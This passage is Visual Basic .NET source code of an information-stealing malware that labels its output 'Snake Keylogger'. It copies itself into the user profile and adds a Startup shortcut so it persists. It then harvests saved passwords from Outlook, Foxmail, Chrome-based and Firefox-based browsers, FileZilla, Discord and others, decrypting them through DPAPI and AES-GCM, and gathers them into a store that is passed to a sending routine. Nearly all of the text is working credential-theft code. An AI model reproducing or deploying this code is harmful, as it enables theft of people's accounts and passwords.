        'usrprufssssss	 System.IO.File.Copy(Application.ExecutablePath, System.Environment.GetEnvironmentVariable("USERPROFILE") + "\%nmoufstr#%.exe", true)
        'usrprufssssss	  System.IO.File.WriteAllText(System.Environment.GetFolderPath(System.Environment.SpecialFolder.Startup) + "/%nmoufstr#%.url", "[InternetShortcut]" + Environment.NewLine + "URL=file:///" + System.Environment.GetEnvironmentVariable("USERPROFILE") + "\%nmoufstr#%.exe")

        'Jsk$ Catch ex As Exception

        'Jsk$    End Try

        '==================== Startup END  ====================

        '$&Outlook&$      COVIDPickers.COVIDSTOutlook()
        '$&Foxmail&$    COVIDPickers.COVIDSTFoxmail()
        '$&Yandex&$    COVIDPickers.COVIDSTYandex()
        '$&Amigo&$    COVIDPickers.COVIDSTAmigo()
        '$&Xpom&$     COVIDPickers.COVIDSTXpom()
        '$&Kometa&$    COVIDPickers.COVIDSTKometa()
        '$&Nichrome&$    COVIDPickers.COVIDSTNichrome()

        '$&Chrome&$   COVIDPickers.COVIDSTChrome()
        '$&CocCoc&$  COVIDPickers.COVIDSTCocCoc()
        '$&QQ&$   COVIDPickers.COVIDSTQQ()
        '$&orbitum&$  COVIDPickers.COVIDSTorbitum()
        '$&slimjet&$     COVIDPickers.COVIDSTSlimjet()
        '$&iridum&$     COVIDPickers.COVIDSTIridium()
        '$&vivaldi&$     COVIDPickers.COVIDSTVivaldi()
        '$&iron&$      COVIDPickers.COVIDSTIron()
        '$&chromium&$      COVIDPickers.COVIDSTChromium()
        '$&ghost&$    COVIDPickers.COVIDSTGhost()
        '$&cent&$    COVIDPickers.COVIDSTCent()
        '$&xVast&$    COVIDPickers.COVIDSTxVast()
        '$&Chedot&$    COVIDPickers.COVIDSTChedot()
        '$&Superbird&$    COVIDPickers.COVIDSTSuperbird()
        '$&360English&$     COVIDPickers.COVIDST360_English()
        '$&360China&$     COVIDPickers.COVIDST360_China()
        '$&comodo&$      COVIDPickers.COVIDSTComodo()
        '$&brave&$    COVIDPickers.COVIDSTBrave()
        '$&torch&$    COVIDPickers.COVIDSTTorch()
        '$&uc&$     COVIDPickers.COVIDSTUC()
        '$&blisk&$     COVIDPickers.COVIDSTBlisk()
        '$&epic&$     COVIDPickers.COVIDSTEpic()
        '$&opera&$     COVIDPickers.COVIDSTOpera()
        '$&filezilla&$     COVIDPickers.COVIDSTFileZilla()
        '$&pidgin&$      COVIDPickers.COVIDSTPidgin()
        '$&liebao&$       COVIDPickers.COVIDSTLiebao()
        '$&avast&$     COVIDPickers.COVIDSTavast()
        '$&Kinzaa&$  COVIDPickers.COVIDSTKinzaa()
        '$&WindowsProductKey&$   COVIDPickers.WindowsProductKey_Orginal()
        '$&BlackHawk&$   COVIDPickers.COVIDSTBlackHawk()
        '$&Citrio&$   COVIDPickers.COVIDSTCitrio()
        '$&Uran&$   COVIDPickers.COVIDSTUran()
        '$&Coowon&$   COVIDPickers.COVIDSTCoowon()
        '$&7Star&$   COVIDPickers.COVIDST7Star()
        '$&QIPSurf&$   COVIDPickers.COVIDSTQIPSurf()
        '$&TheWiFi&$  COVIDPickers.TheWiFi_Orginal()
        '$&Sleipnir&$   COVIDPickers.COVIDSTSleipnir()
        '$&ChromeCanary&$   COVIDPickers.COVIDSTChrome_Canary()
        '$&CoolNovo&$   COVIDPickers.COVIDSTCoolNovo()
        '$&SalamWeb&$   COVIDPickers.COVIDSTSalamWeb()
        '$&Sputnik&$   COVIDPickers.COVIDSTSputnik()
        '$&Falkon&$   COVIDPickers.COVIDSTFalkon()
        '$&eLEMENTS&$ COVIDPickers.COVIDSTElements()
        '$&EdgeChrome&$ COVIDPickers.COVIDSTMicrosoft()
        '$&Discord&$     COVIDPickers.COVIDSTDiscord()


        '$&IceCat&$   COVIDRandomz.COVIDSTIceCat()
        '$&TheSlimRecovery&$   COVIDRandomz.COVIDSTSlim()
        '$&firefox&$   COVIDRandomz.COVIDSTFireFox()
        '$&thunderbird&$      COVIDRandomz.COVIDSTThunderbird()
        '$&seamonkey&$      COVIDRandomz.COVIDSTSeaMonkey()
        '$&icedragon&$     COVIDRandomz.COVIDSTIceDragon()
        '$&cyberfox&$     COVIDRandomz.COVIDSTCyberFox()
        '$&palemoon&$     COVIDRandomz.COVIDSTPaleMoon()
        '$&WaterFox&$    COVIDRandomz.COVIDSTWaterFox()
        '$&PostBox&$   COVIDRandomz.COVIDSTPostBox()




        '========== Senders Pswd ==========



        If StoragePW = Nothing Then
        Else



            TheStoragePWSender()


            '(%TheSendersTeimrsHere%)     Try
            '(%TheSendersTeimrsHere%) 	TPSSends.Start
            '(%TheSendersTeimrsHere%)   TPSSends.Interval = 77125456
            '(%TheSendersTeimrsHere%)	Catch v As Exception
            '(%TheSendersTeimrsHere%) 	End Try

            '========== Senders End ========== 




        End If


        Application.Run()
    End Sub



End Module


#Region "Module Encryptor"
Public Module BCrypt

    Public Declare Function BCryptOpenAlgorithmProvider Lib "bcrypt.dll" (<System.Runtime.InteropServices.OutAttribute()> ByRef phAlgorithm As IntPtr, <MarshalAs(UnmanagedType.LPWStr)> pszAlgId As String, <MarshalAs(UnmanagedType.LPWStr)> pszImplementation As String, dwFlags As UInteger) As UInteger


    Public Declare Function BCryptCloseAlgorithmProvider Lib "bcrypt.dll" (hAlgorithm As IntPtr, flags As UInteger) As UInteger


    Public Declare Function BCryptGetProperty Lib "bcrypt.dll" (hObject As IntPtr, <MarshalAs(UnmanagedType.LPWStr)> pszProperty As String, pbOutput As Byte(), cbOutput As Integer, ByRef pcbResult As Integer, flags As UInteger) As UInteger


    Friend Declare Function BCryptSetAlgorithmProperty Lib "bcrypt.dll" Alias "BCryptSetProperty" (hObject As IntPtr, <MarshalAs(UnmanagedType.LPWStr)> pszProperty As String, pbInput As Byte(), cbInput As Integer, dwFlags As Integer) As UInteger

    ' Token: 0x06000015 RID: 21
    Public Declare Function BCryptImportKey Lib "bcrypt.dll" (hAlgorithm As IntPtr, hImportKey As IntPtr, <MarshalAs(UnmanagedType.LPWStr)> pszBlobType As String, <System.Runtime.InteropServices.OutAttribute()> ByRef phKey As IntPtr, pbKeyObject As IntPtr, cbKeyObject As Integer, pbInput As Byte(), cbInput As Integer, dwFlags As UInteger) As UInteger

    ' Token: 0x06000016 RID: 22
    Public Declare Function BCryptDestroyKey Lib "bcrypt.dll" (hKey As IntPtr) As UInteger

    ' Token: 0x06000017 RID: 23
    Public Declare Function BCryptEncrypt Lib "bcrypt.dll" (hKey As IntPtr, pbInput As Byte(), cbInput As Integer, ByRef pPaddingInfo As BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, pbIV As Byte(), cbIV As Integer, pbOutput As Byte(), cbOutput As Integer, ByRef pcbResult As Integer, dwFlags As UInteger) As UInteger

    ' Token: 0x06000018 RID: 24
    Friend Declare Function BCryptDecrypt Lib "bcrypt.dll" (hKey As IntPtr, pbInput As Byte(), cbInput As Integer, ByRef pPaddingInfo As BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, pbIV As Byte(), cbIV As Integer, pbOutput As Byte(), cbOutput As Integer, ByRef pcbResult As Integer, dwFlags As Integer) As UInteger

    ' Token: 0x04000005 RID: 5
    Public Const ERROR_SUCCESS As UInteger = 0UI

    ' Token: 0x04000006 RID: 6
    Public Const BCRYPT_PAD_PSS As UInteger = 8UI

    ' Token: 0x04000007 RID: 7
    Public Const BCRYPT_PAD_OAEP As UInteger = 4UI

    ' Token: 0x04000008 RID: 8
    Public BCRYPT_KEY_DATA_BLOB_MAGIC As Byte() = BitConverter.GetBytes(1296188491)

    ' Token: 0x04000009 RID: 9
    Public BCRYPT_OBJECT_LENGTH As String = "ObjectLength"

    ' Token: 0x0400000A RID: 10
    Public BCRYPT_CHAIN_MODE_GCM As String = "ChainingModeGCM"

    ' Token: 0x0400000B RID: 11
    Public BCRYPT_AUTH_TAG_LENGTH As String = "AuthTagLength"

    ' Token: 0x0400000C RID: 12
    Public BCRYPT_CHAINING_MODE As String = "ChainingMode"

    ' Token: 0x0400000D RID: 13
    Public BCRYPT_KEY_DATA_BLOB As String = "KeyDataBlob"

    ' Token: 0x0400000E RID: 14
    Public BCRYPT_AES_ALGORITHM As String = "AES"

    ' Token: 0x0400000F RID: 15
    Public MS_PRIMITIVE_PROVIDER As String = "Microsoft Primitive Provider"

    ' Token: 0x04000010 RID: 16
    Public BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG As Integer = 1

    ' Token: 0x04000011 RID: 17
    Public BCRYPT_INIT_AUTH_MODE_INFO_VERSION As Integer = 1

    ' Token: 0x04000012 RID: 18
    Public STATUS_AUTH_TAG_MISMATCH As UInteger = 3221266434UI

    ' Token: 0x02000009 RID: 9
    Public Structure BCRYPT_PSS_PADDING_INFO
        ' Token: 0x06000030 RID: 48 RVA: 0x000044D1 File Offset: 0x000026D1
        Public Sub New(pszAlgId As String, cbSalt As Integer)
            Me.pszAlgId = pszAlgId
            Me.cbSalt = cbSalt
        End Sub

        ' Token: 0x0400001D RID: 29
        <MarshalAs(UnmanagedType.LPWStr)>
        Public pszAlgId As String

        ' Token: 0x0400001E RID: 30
        Public cbSalt As Integer
    End Structure

    ' Token: 0x0200000A RID: 10
    Public Structure BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
        Implements IDisposable

        ' Token: 0x06000031 RID: 49 RVA: 0x000044E4 File Offset: 0x000026E4
        Public Sub New(iv As Byte(), aad As Byte(), tag As Byte())

            Me.dwInfoVersion = BCrypt.BCRYPT_INIT_AUTH_MODE_INFO_VERSION
            Me.cbSize = Marshal.SizeOf(GetType(BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO))
            Dim flag As Boolean = iv IsNot Nothing
            If flag Then
                Me.cbNonce = iv.Length
                Me.pbNonce = Marshal.AllocHGlobal(Me.cbNonce)
                Marshal.Copy(iv, 0, Me.pbNonce, Me.cbNonce)
            End If
            Dim flag2 As Boolean = aad IsNot Nothing
            If flag2 Then
                Me.cbAuthData = aad.Length
                Me.pbAuthData = Marshal.AllocHGlobal(Me.cbAuthData)
                Marshal.Copy(aad, 0, Me.pbAuthData, Me.cbAuthData)
            End If
            Dim flag3 As Boolean = tag IsNot Nothing
            If flag3 Then
                Me.cbTag = tag.Length
                Me.pbTag = Marshal.AllocHGlobal(Me.cbTag)
                Marshal.Copy(tag, 0, Me.pbTag, Me.cbTag)
                Me.cbMacContext = tag.Length
                Me.pbMacContext = Marshal.AllocHGlobal(Me.cbMacContext)
            End If
        End Sub

        ' Token: 0x06000032 RID: 50 RVA: 0x000045DC File Offset: 0x000027DC
        Public Sub Dispose() Implements System.IDisposable.Dispose
            Dim flag As Boolean = Me.pbNonce <> IntPtr.Zero
            If flag Then
                Marshal.FreeHGlobal(Me.pbNonce)
            End If
            Dim flag2 As Boolean = Me.pbTag <> IntPtr.Zero
            If flag2 Then
                Marshal.FreeHGlobal(Me.pbTag)
            End If
            Dim flag3 As Boolean = Me.pbAuthData <> IntPtr.Zero
            If flag3 Then
                Marshal.FreeHGlobal(Me.pbAuthData)
            End If
            Dim flag4 As Boolean = Me.pbMacContext <> IntPtr.Zero
            If flag4 Then
                Marshal.FreeHGlobal(Me.pbMacContext)
            End If
        End Sub

        ' Token: 0x0400001F RID: 31
        Public cbSize As Integer

        ' Token: 0x04000020 RID: 32
        Public dwInfoVersion As Integer

        ' Token: 0x04000021 RID: 33
        Public pbNonce As IntPtr

        ' Token: 0x04000022 RID: 34
        Public cbNonce As Integer

        ' Token: 0x04000023 RID: 35
        Public pbAuthData As IntPtr

        ' Token: 0x04000024 RID: 36
        Public cbAuthData As Integer

        ' Token: 0x04000025 RID: 37
        Public pbTag As IntPtr

        ' Token: 0x04000026 RID: 38
        Public cbTag As Integer

        ' Token: 0x04000027 RID: 39
        Public pbMacContext As IntPtr

        ' Token: 0x04000028 RID: 40
        Public cbMacContext As Integer

        ' Token: 0x04000029 RID: 41
        Public cbAAD As Integer

        ' Token: 0x0400002A RID: 42
        Public cbData As Long

        ' Token: 0x0400002B RID: 43
        Public dwFlags As Integer
    End Structure

    ' Token: 0x0200000B RID: 11
    Public Structure BCRYPT_KEY_LENGTHS_STRUCT
        ' Token: 0x0400002C RID: 44
        Public dwMinLength As Integer

        ' Token: 0x0400002D RID: 45
        Public dwMaxLength As Integer

        ' Token: 0x0400002E RID: 46
        Public dwIncrement As Integer
    End Structure

    Public Structure BCRYPT_OAEP_PADDING_INFO
        Public Sub New(alg As String)
            Me.pszAlgId = alg
            Me.pbLabel = IntPtr.Zero
            Me.cbLabel = 0
        End Sub

        <MarshalAs(UnmanagedType.LPWStr)>
        Public pszAlgId As String

        Public pbLabel As IntPtr


        Public cbLabel As Integer
    End Structure
End Module
#End Region

#Region "Data Class"
Friend Class AesGcm

    Public Function Decrypt(key As Byte(), iv As Byte(), aad As Byte(), cipherText As Byte(), authTag As Byte()) As Byte()
        Dim hAlg As IntPtr = Me.OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM)
        Dim hKey As IntPtr
        Dim keyDataBuffer As IntPtr = Me.ImportKey(hAlg, key, hKey)
        Dim authInfo As BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO = New BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag)
        Dim plainText As Byte()
        Using authInfo
            Dim ivData As Byte() = New Byte(Me.MaxAuthTagSize(hAlg) - 1) {}
            Dim plainTextSize As Integer = 0
            Dim status As UInteger = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, authInfo, ivData, ivData.Length, Nothing, 0, plainTextSize, 0)
            Dim flag As Boolean = status > 0UI
            If flag Then
                Throw New CryptographicException(String.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", status))
            End If
            plainText = New Byte(plainTextSize - 1) {}
            status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, authInfo, ivData, ivData.Length, plainText, plainText.Length, plainTextSize, 0)
            Dim flag2 As Boolean = status = BCrypt.STATUS_AUTH_TAG_MISMATCH
            If flag2 Then
                Throw New CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch")
            End If
            Dim flag3 As Boolean = status > 0UI
            If flag3 Then
                Throw New CryptographicException(String.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", status))
            End If
        End Using
        BCrypt.BCryptDestroyKey(hKey)
        Marshal.FreeHGlobal(keyDataBuffer)
        BCrypt.BCryptCloseAlgorithmProvider(hAlg, 0UI)
        Return plainText
    End Function


    Private Function MaxAuthTagSize(hAlg As IntPtr) As Integer
        Dim tagLengthsValue As Byte() = Me.GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH)
        Return BitConverter.ToInt32(New Byte() {tagLengthsValue(4), tagLengthsValue(5), tagLengthsValue(6), tagLengthsValue(7)}, 0)
    End Function


    Private Function OpenAlgorithmProvider(alg As String, provider As String, chainingMode As String) As IntPtr
        Dim hAlg As IntPtr = IntPtr.Zero
        Dim status As UInteger = BCrypt.BCryptOpenAlgorithmProvider(hAlg, alg, provider, 0UI)
        Dim flag As Boolean = status > 0UI
        If flag Then
            Throw New CryptographicException(String.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", status))
        End If
        Dim chainMode As Byte() = Encoding.Unicode.GetBytes(chainingMode)
        status = BCrypt.BCryptSetAlgorithmProperty(hAlg, BCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0)
        Dim flag2 As Boolean = status > 0UI
        If flag2 Then
            Throw New CryptographicException(String.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", status))
        End If
        Return hAlg
    End Function

    Private Function ImportKey(hAlg As IntPtr, key As Byte(), <System.Runtime.InteropServices.OutAttribute()> ByRef hKey As IntPtr) As IntPtr
        Dim objLength As Byte() = Me.GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH)
        Dim keyDataSize As Integer = BitConverter.ToInt32(objLength, 0)
        Dim keyDataBuffer As IntPtr = Marshal.AllocHGlobal(keyDataSize)
        Dim keyBlob As Byte() = Me.Concat(New Byte()() {BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key})
        Dim status As UInteger = BCrypt.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0UI)
        Dim flag As Boolean = status > 0UI
        If flag Then
            Throw New CryptographicException(String.Format("BCrypt.BCryptImportKey() failed with status code:{0}", status))
        End If
        Return keyDataBuffer
    End Function


    Private Function GetProperty(hAlg As IntPtr, name As String) As Byte()
        Dim size As Integer = 0
        Dim status As UInteger = BCrypt.BCryptGetProperty(hAlg, name, Nothing, 0, size, 0UI)
        Dim flag As Boolean = status > 0UI
        If flag Then
            Throw New CryptographicException(String.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", status))
        End If
        Dim value As Byte() = New Byte(size - 1) {}
        status = BCrypt.BCryptGetProperty(hAlg, name, value, value.Length, size, 0UI)
        Dim flag2 As Boolean = status > 0UI
        If flag2 Then
            Throw New CryptographicException(String.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", status))
        End If
        Return value
    End Function

    Public Function Concat(ParamArray arrays As Byte()()) As Byte()
        Dim len As Integer = 0
        For Each array As Byte() In arrays
            Dim flag As Boolean = array Is Nothing
            If Not flag Then
                len += array.Length
            End If
        Next
        Dim result As Byte() = New Byte(len - 1 + 1 - 1) {}
        Dim offset As Integer = 0
        For Each array2 As Byte() In arrays
            Dim flag2 As Boolean = array2 Is Nothing
            If Not flag2 Then
                Buffer.BlockCopy(array2, 0, result, offset, array2.Length)
                offset += array2.Length
            End If
        Next
        Return result
    End Function
End Class

#End Region

Module COVIDPickers

#Region "Get PSWDS Functions"


#Region "Outlook Recovery"
    Public Sub COVIDSTOutlook()
        Dim ot As New List(Of RecoveredApplicationAccount)
        ot = GetOutlookPasswords()
        If ot.Count > 0 Then
            For Each Account As RecoveredApplicationAccount In ot
                Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Outlook" & vbNewLine & "URL: " & Account.URL & vbNewLine & "E-Mail: " & Account.UserName & vbNewLine & "PSWD: " & Account.Password & vbNewLine + "---------------------------------" + vbNewLine + " ")
                COVID19.StoragePW += cPass

            Next
        Else
        End If
    End Sub

    Friend Function GetOutlookPasswords() As List(Of RecoveredApplicationAccount)
        Dim data As New List(Of RecoveredApplicationAccount)()

        Dim passValues As String() = {"IMAP Password", "POP3 Password", "HTTP Password", "SMTP Password"} 'Outlook storage password value name depend your client type. It using 4 different name
        Dim EncPass As Byte()
        Dim decPass As String = Nothing
        Dim byteMail As Byte()
        Dim byteSmtp As Byte()

        'Outlook change sub key folder name and path in every version. I added 2007, 2010, 2013 and 2016 paths. If you know different version, you can add this.rray.
        Dim pRegKey As RegistryKey() = {Registry.CurrentUser.OpenSubKey("Software\Microsoft\Office\15.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"),
            Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"),
            Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676"),
            Registry.CurrentUser.OpenSubKey("Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676")}

        '   Try

        For Each RegKey As RegistryKey In pRegKey

            If RegKey IsNot Nothing Then

                For Each KeyName As String In RegKey.GetSubKeyNames 'We should check sub key names in selected registry key with a loop.

                    Using key As RegistryKey = RegKey.OpenSubKey(KeyName)

                        Dim enc As New UTF8Encoding()

                        'I checking email and passwords. Email and a password value required for recovery. I merged all password value names with "OR" operator.
                        If key.GetValue("Email") IsNot Nothing And (key.GetValue("IMAP Password") IsNot Nothing Or
                        key.GetValue("POP3 Password") IsNot Nothing Or
                        key.GetValue("HTTP Password") IsNot Nothing Or
                        key.GetValue("SMTP Password") IsNot Nothing) Then

                            For Each str As String In passValues
                                If key.GetValue(str) IsNot Nothing Then
                                    EncPass = DirectCast(key.GetValue(str), Byte()) 'Outlook saved encrypted password as bytes.
                                    decPass = decryptOutlookPassword(EncPass) 'Decrypt password.
                                End If
                            Next

                            Dim mailObj As Object = key.GetValue("Email")
                            Try 'I use a "Try" for get email value. 
                                'Why? Because Outlook saved emails as string on older version but now it using bytes. 
                                'You can use a more practical way.
                                byteMail = enc.GetBytes(mailObj)
                            Catch
                                byteMail = DirectCast(mailObj, Byte())
                            End Try



                            Dim smtpObj As Object = key.GetValue("SMTP Server")
                            If smtpObj IsNot Nothing Then
                                Try
                                    byteSmtp = enc.GetBytes(smtpObj)
                                Catch
                                    byteSmtp = DirectCast(smtpObj, Byte())
                                End Try
                            Else
                                byteSmtp = enc.GetBytes("Nothing")
                            End If


                            Dim RBA As New RecoveredApplicationAccount()
                            RBA.URL = enc.GetString(byteSmtp).Replace(Chr(0), "")
                            RBA.UserName = enc.GetString(byteMail).ToString().Replace(Convert.ToChar(0), "")
                            RBA.Password = decPass.Replace(Convert.ToChar(0), "")
                            RBA.appName = "Outlook"
                            data.Add(RBA)
                        End If

                    End Using

                Next

            End If

        Next
        Return New List(Of RecoveredApplicationAccount)(data)
    End Function
    Friend NotInheritable Class RecoveredApplicationAccount
        Private _appName As String
        Private _username As String
        Private _password As String
        Private _URL As String

        Friend Property UserName() As String
            Get
                Return _username
            End Get
            Set(Value As String)
                _username = Value
            End Set
        End Property

        Friend Property Password() As String
            Get
                Return _password
            End Get
            Set(Value As String)
                _password = Value
            End Set
        End Property

        Friend Property URL() As String
            Get
                Return _URL
            End Get
            Set(Value As String)
                _URL = Value
            End Set
        End Property

        Friend Property appName() As String
            Get
                Return _appName
            End Get
            Set(Value As String)
                _appName = Value
            End Set
        End Property

    End Class


    Function decryptOutlookPassword(encryptedData As Byte()) As String
        Dim decPassword As String
        Dim Data(encryptedData.Length - 2) As Byte
        Buffer.BlockCopy(encryptedData, 1, Data, 0, encryptedData.Length - 1)
        decPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(Data, Nothing, DataProtectionScope.CurrentUser))
        decPassword = decPassword.Replace(Convert.ToChar(0), "")
        Return decPassword
    End Function
#End Region


#Region "Foxmail Recovery"
    Public Sub COVIDSTFoxmail()

        Try
            Dim foxPath As String = Registry.LocalMachine.OpenSubKey("SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command").GetValue("").ToString()

            foxPath = foxPath.Remove(foxPath.LastIndexOf("Foxmail.exe")).Replace("""", "") + "Storage\"
            For Each Dir As String In System.IO.Directory.GetDirectories(foxPath)
                Dim dirInfo As New System.IO.DirectoryInfo(Dir)
                Dim eMail As String = Dir.Substring(Dir.LastIndexOf("\") + 1)
                Dim userData As String = Dir + "\Accounts\Account.rec0"
                Dim fs As FileStream = New FileStream(userData, FileMode.Open)
                Dim len As Integer = CInt(fs.Length)
                Dim bits As Byte() = New Byte(len - 1) {}
                Dim accfound As Boolean = False
                Dim buffer As String = ""
                fs.Read(bits, 0, len)
                Dim flag As Boolean = bits(0) = 208
                Dim ver As Integer
                If flag Then
                    ver = 0
                Else
                    ver = 1
                End If

                For jx As Integer = 0 To len - 1
                    Dim flag2 As Boolean = bits(jx) > 32 AndAlso bits(jx) < 127 AndAlso bits(jx) <> 61
                    If flag2 Then
                        Dim arg_131_0 As String = buffer
                        Dim c As Char = ChrW(bits(jx))
                        buffer = arg_131_0 + c.ToString()
                        Dim acc As String = ""
                        Dim flag3 As Boolean = buffer.Equals("Account") OrElse buffer.Equals("POP3Account")
                        If flag3 Then
                            Dim index As Integer = jx + 9
                            Dim flag4 As Boolean = ver = 0
                            If flag4 Then
                                index = jx + 2
                            End If
                            While bits(index) > 32 AndAlso bits(index) < 127
                                Dim arg_190_0 As String = acc
                                c = ChrW(bits(index))
                                acc = arg_190_0 + c.ToString()
                                index += 1
                            End While
                            accfound = True
                            jx = index
                        Else
                            Dim flag5 As Boolean = accfound AndAlso (buffer.Equals("Password") OrElse buffer.Equals("POP3Password"))
                            If flag5 Then
                                Dim index2 As Integer = jx + 9
                                Dim flag6 As Boolean = ver = 0
                                If flag6 Then
                                    index2 = jx + 2
                                End If
                                Dim pw As String = ""
                                While bits(index2) > 32 AndAlso bits(index2) < 127
                                    Dim Zla As String = pw
                                    c = ChrW(bits(index2))
                                    pw = Zla + c.ToString()
                                    index2 += 1
                                End While
                                If eMail = "" And pw = "" Then

                                Else
                                    pw = pw.Replace("!", "")
                                    Dim cPass = (vbNewLine + "-------- Snake Keylogger --------" + vbNewLine + "Found From: Foxmail" & vbNewLine & String.Format("E-Mail: {0}", eMail) & vbNewLine & String.Format("PSWD: {0}", decodePW(ver, pw)) & vbNewLine + "---------------------------------" + vbNewLine + " ")
                                    COVID19.StoragePW += cPass
                                End If
                                Exit For
                            End If
                        End If
                    Else
                        buffer = ""
                    End If
                Next

                fs.Close()
            Next
        Catch ex As Exception
        End Try


    End Sub

    Public Function decodePW(v As Integer, pHash As String) As String
        Dim decodedPW As String = ""
        Dim a As Integer() = New Integer() {126, 100, 114, 97, 71, 111, 110, 126}
        Dim v7a As Integer() = New Integer() {126, 70, 64, 55, 37, 109, 36, 126}
        Dim fc0 As Integer = Convert.ToInt32("5A", 16)
        Dim flag As Boolean = v = 1
        If flag Then
            a = v7a
            fc0 = Convert.ToInt32("71", 16)
        End If
        Dim size As Integer = pHash.Length / 2
        Dim index As Integer = 0
        Dim b As Integer() = New Integer(size - 1) {}
        For i As Integer = 0 To size - 1
            b(i) = Convert.ToInt32(pHash.Substring(index, 2), 16)
            index += 2
        Next
        Dim c As Integer() = New Integer(b.Length - 1) {}
        c(0) = (b(0) Xor fc0)
        Array.Copy(b, 1, c, 1, b.Length - 1)
        While b.Length > a.Length
            Dim newA As Integer() = New Integer(a.Length * 2 - 1) {}
            Array.Copy(a, 0, newA, 0, a.Length)
            Array.Copy(a, 0, newA, a.Length, a.Length)
            a = newA
        End While
        Dim d As Integer() = New Integer(b.Length - 1) {}
        For j As Integer = 1 To b.Length - 1
            d(j - 1) = (b(j) Xor a(j - 1))
        Next
        Dim e As Integer() = New Integer(d.Length - 1) {}
        For k As Integer = 0 To d.Length - 1 - 1
            Dim flag2 As Boolean = d(k) - c(k) < 0
            If flag2 Then
                e(k) = d(k) + 255 - c(k)
            Else
                e(k) = d(k) - c(k)
            End If
            decodedPW += (ChrW(e(k))).ToString()
        Next
        Return decodedPW
    End Function
#End Region

#Region "New Chrome Encryption"
    Public Function isV10(s As String) As Boolean
        If s.Substring(0, 3) = "v10" Then
            Return True
        End If
        Return False
    End Function
    Public Function GetMasterKey(LocalStateFolder As String) As Byte()
        Dim filePath As String = LocalStateFolder + "\Local State"
        Dim masterKey As Byte() = New Byte(-1) {}
        Dim flag As Boolean = Not File.Exists(filePath)
        Dim result As Byte()
        If flag Then
            result = Nothing
        Else
            Dim pattern As MatchCollection = New Regex("""encrypted_key"":""(.*?)""", RegexOptions.Compiled).Matches(File.ReadAllText(filePath))
            For Each obj As Object In pattern
                Dim prof As Match = CType(obj, Match)
                Dim success As Boolean = prof.Success
                If success Then
                    masterKey = Convert.FromBase64String(prof.Groups(1).Value)
                End If
            Next
            Dim temp As Byte() = New Byte(masterKey.Length - 5 - 1) {}
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5)
            Try
                result = ProtectedData.Unprotect(temp, Nothing, DataProtectionScope.CurrentUser)
            Catch ex As Exception
                Console.WriteLine(ex.ToString())
                result = Nothing
            End Try
        End If
        Return result
    End Function
    Public Function DecryptWithKey(encryptedData As Byte(), MasterKey As Byte()) As String
        Dim iv As Byte() = New Byte(11) {}
        Array.Copy(encryptedData, 3, iv, 0, 12)
        Dim result2 As String
        Try
            Dim Buffer As Byte() = New Byte(encryptedData.Length - 15 - 1) {}
            Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15)
            Dim tag As Byte() = New Byte(15) {}
            Dim data As Byte() = New Byte(Buffer.Length - tag.Length - 1) {}
            Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16)
            Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length)
            Dim aesDecryptor As AesGcm = New AesGcm()
            Dim result As String = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, Nothing, data, tag))
            result2 = result
        Catch ex As Exception
            Console.WriteLine(ex.ToString())
            result2 = Nothing
        End Try
        Return result2
    End Function
#End Region

#Region "Chromuim Based"
    Public Sub COVIDSTKinzaa()

        Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Kinza\User Data\Default\Login Data"

        Try
            Dim SQLDatabase = New SQLiteHandler(datapath)
            SQLDatabase.ReadTable("logins")

            If File.Exists(datapath) Then

                Dim hostss, userrrrr, pass55 As String

                For i As Integer = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                    hostss = SQLDatabase.GetValue(i, "origin_url")
                    userrrrr = SQLDatabase.GetValue(i, "username_value")
                    pass55 = SQLDatabase.GetValue(i, "password_value")

                    If isV10(pass55) Then
                        Dim masterKey As Byte() = GetMasterKey(Directory.GetParent(datapath).Parent.FullName)
                        Dim flag5 As Boolean = masterKey Is Nothing
                        If Not flag5 Then
                            pass55 = DecryptWithKey(Encoding.[Default].GetBytes(pass55), masterKey)

                        End If


